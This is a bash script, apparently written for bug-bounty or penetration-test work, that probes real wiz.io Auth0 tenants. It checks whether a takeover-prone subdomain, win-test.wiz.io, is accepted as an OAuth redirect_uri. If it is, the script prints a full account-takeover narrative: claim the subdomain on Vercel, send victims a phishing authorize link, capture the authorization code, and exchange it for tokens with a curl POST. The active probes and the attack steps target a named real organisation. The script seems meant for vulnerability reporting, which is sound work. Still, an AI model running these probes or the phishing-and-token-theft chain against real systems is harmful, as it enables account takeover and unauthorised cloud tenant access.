#!/usr/bin/env bash
# oauth-redirect-test-wiz.sh
# Tests whether win-test.wiz.io is in ANY Auth0 application's redirect_uri allowlist.
#
# Usage: CLIENT_ID=<id> bash scripts/oauth-redirect-test-wiz.sh
# Or:    bash scripts/oauth-redirect-test-wiz.sh  (prompts for client_id)
set -euo pipefail

OUT="results/wiz.io/chain-tests"
mkdir -p "$OUT"
UA="Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"

RED='\033[0;31m'; CYAN='\033[0;36m'; GREEN='\033[0;32m'; NC='\033[0m'
hit()  { echo -e "${RED}[CHAIN HIT — CRITICAL]${NC} $*"; }
ok()   { echo -e "${GREEN}[MISS]${NC} $*"; }
info() { echo -e "${CYAN}[*]${NC} $*"; }

if [ -z "${CLIENT_ID:-}" ]; then
  echo -n "Enter Auth0 client_id: "
  read -r CLIENT_ID
fi

TENANTS=("auth.wiz.io" "auth0.demo.wiz.io" "auth0.e2e.wiz.io")
TARGET_CALLBACK="https://win-test.wiz.io/callback"
TARGET_ROOT="https://win-test.wiz.io/"

echo ""
echo -e "${CYAN}═══ OAuth redirect_uri Chain Test — F001 ═══${NC}"
echo "client_id: $CLIENT_ID"
echo "redirect_uri under test: $TARGET_CALLBACK"
echo ""

for TENANT in "${TENANTS[@]}"; do
  info "Testing tenant: $TENANT"

  # Test 1: Exact /callback path
  echo -n "  redirect_uri=$TARGET_CALLBACK → "
  RESP=$(curl -sk -I --max-redirs 0 -H "User-Agent: $UA" \
    "https://${TENANT}/authorize?response_type=code&client_id=${CLIENT_ID}&redirect_uri=$(python3 -c "import urllib.parse; print(urllib.parse.quote('$TARGET_CALLBACK'))")&scope=openid+profile+email&state=chain_test_poc" \
    2>/dev/null | grep -iE "^HTTP|^location:" || true)
  echo "$RESP"
  if echo "$RESP" | grep -qi "win-test.wiz.io"; then
    hit "OAUTH CHAIN CONFIRMED on $TENANT"
    hit "win-test.wiz.io IS in the redirect_uri allowlist"
    hit "Account takeover possible — see attack narrative below"
    echo "$RESP" >> "$OUT/oauth-chain-confirmed.txt"
  elif echo "$RESP" | grep -qiE "callback_url_mismatch|unauthorized_client|error"; then
    ok "Rejected by $TENANT — not in allowlist"
  fi

  # Test 2: Root URL (some registrations use / not /callback)
  echo -n "  redirect_uri=$TARGET_ROOT → "
  RESP2=$(curl -sk -I --max-redirs 0 -H "User-Agent: $UA" \
    "https://${TENANT}/authorize?response_type=code&client_id=${CLIENT_ID}&redirect_uri=$(python3 -c "import urllib.parse; print(urllib.parse.quote('$TARGET_ROOT'))")&scope=openid&state=chain_test_poc2" \
    2>/dev/null | grep -iE "^HTTP|^location:" || true)
  echo "$RESP2"
  if echo "$RESP2" | grep -qi "win-test.wiz.io"; then
    hit "OAUTH CHAIN CONFIRMED (root URL) on $TENANT"
    echo "$RESP2" >> "$OUT/oauth-chain-confirmed.txt"
  fi
  echo ""
done

# Attack narrative (printed on success)
if [ -f "$OUT/oauth-chain-confirmed.txt" ]; then
  echo ""
  echo -e "${RED}═══════════════════════════════════════════════════${NC}"
  echo -e "${RED}  CRITICAL CHAIN CONFIRMED — ATTACK NARRATIVE       ${NC}"
  echo -e "${RED}═══════════════════════════════════════════════════${NC}"
  echo ""
  echo "  1. Attacker claims win-test.wiz.io on Vercel (30 sec, free account)"
  echo "     bash scripts/claim-vercel-poc.sh"
  echo ""
  echo "  2. Attacker hosts a /callback endpoint that logs the ?code= parameter"
  echo "     (The vercel PoC already does this — see index.html)"
  echo ""
  echo "  3. Attacker crafts a phishing link:"
  echo "     https://auth.wiz.io/authorize?"
  echo "       client_id=$CLIENT_ID"
  echo "       &redirect_uri=https://win-test.wiz.io/callback"
  echo "       &response_type=code"
  echo "       &scope=openid+profile+email"
  echo "       &state=$(openssl rand -hex 8)"
  echo ""
  echo "  4. Victim receives link (via email/community.wiz.io/Slack)"
  echo "     Clicks → Auth0 login page (LEGITIMATE) → authenticates"
  echo "     Auth0 redirects to win-test.wiz.io/callback?code=XXXXX"
  echo ""
  echo "  5. Attacker exchanges code for tokens:"
  echo "     curl -X POST https://auth.wiz.io/oauth/token \\"
  echo "       -d 'grant_type=authorization_code"
  echo "           &client_id=$CLIENT_ID"
  echo "           &redirect_uri=https://win-test.wiz.io/callback"
  echo "           &code=XXXXX'"
  echo ""
  echo "  6. Access+ID tokens → authenticate to app.wiz.io → tenant access"
  echo "     Wiz tenant = cloud IAM connector = potential cloud environment access"
  echo ""
  echo "  CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:N → 9.3 CRITICAL"
  echo ""
  echo "  REPORT: Update F001 severity + add OAuth chain section"
  echo "  EVIDENCE: Save $OUT/oauth-chain-confirmed.txt as attachment"
fi
